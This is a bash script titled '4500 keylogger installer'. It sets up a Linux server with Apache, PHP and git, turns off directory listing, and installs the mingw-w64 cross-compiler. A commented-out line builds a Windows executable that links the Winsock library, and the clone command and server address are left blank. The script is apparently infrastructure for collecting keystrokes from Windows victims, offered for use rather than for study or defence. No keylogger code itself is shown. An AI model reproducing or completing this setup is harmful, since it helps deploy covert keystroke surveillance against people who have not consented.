#! /bin/bash

#4500 keylogger installer
################################
server_ip='' #ex) 33.33.33.33

################################


echo "[*] == 4500 keylogger installer == "

echo "[ ] The installer will automatically start in 3 seconds."

sleep 3

echo "[*] update system and install dependencies"


#setting apt and install lib apache,php,git

sudo apt update
sudo apt upgrade -y
sudo apt install -y git apache2 php libapache2-mod-php
sudo apt-get install mingw-w64
#protect dirctory listing
sed -i 's/Indexes//' /etc/apache2/apache2.conf


#php php working borwser

sudo a2dismod mpm_event
sudo a2enmod mpm_prefork

#restart apache
sudo service apache2 restart



#install module for make from .exe file to C Langue and Python

#git clone 




#i686-w64-mingw32-gcc test.c -o hello.exe -lws2_32
